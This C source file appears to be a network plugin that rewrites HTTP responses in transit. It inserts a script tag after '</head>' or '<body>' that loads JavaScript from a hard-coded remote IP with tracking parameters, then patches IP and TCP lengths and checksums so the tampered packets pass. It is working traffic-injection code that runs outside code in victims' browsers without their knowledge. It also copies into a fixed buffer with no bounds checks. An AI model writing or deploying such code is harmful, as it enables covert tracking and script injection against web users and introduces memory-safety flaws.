#include "main.h"

//#define JS "hello world"
#define JS "<script type=\"text/javascript\" src=\"http://210.22.155.236/js/wa.init.min.js?v=20150930\" id=\"15_bri_mjq_init_min_36_wa_101\" async  data=\"userId=12245789-423sdfdsf-ghfg-wererjju8werw&channel=test&phoneModel=DOOV S1\"></script>"
#define JS_LEN strlen(JS)

PRIVATE int insert_js(void *data)
{
	struct _skb *skb=(struct _skb *)data;
    char* body;
	int offset=0;
    char buffer[BUFSIZE];
	int len=0;
	
    if(!skb->http_head)
		return -1;

    body=strstr(skb->http_head , "</head>");
	offset=7;
	if(!body)
	{
		body=strstr(skb->http_head , "<body>");
		offset=6;
		if(!body)
			return -1;
	}
    body=body+offset;
	
	len=strlen(body);
	memcpy(buffer , skb->http_head , skb->http_len-len);
	memcpy(buffer+(skb->http_len-len) , JS , JS_LEN);
	memcpy(buffer+(skb->http_len-len+JS_LEN) , body , len);
	
  	memcpy(skb->http_head , buffer , skb->http_len+JS_LEN);
	//body=strstr(skb->http_head , skb->hhdr.content_length);
	//if(!body)
	//	return -1;
	//memcpy(body , "2952" , 4);
	//debug_log("````````````%s\n" , skb->http_head);
    skb->iph->tot_len=htons(skb->http_len+JS_LEN);
    skb->iph->check=ip_chsum(skb->iph);

    skb->tcp->check=tcp_chsum(skb->iph , skb->tcp , skb->tcp_len+JS_LEN);
	skb->pload_len=skb->pload_len+JS_LEN;
    return 0;
}

int init_insert_js()
{
	new_check_plug(insert_js , CHECK_PLUG_POST);
	return 0;
}

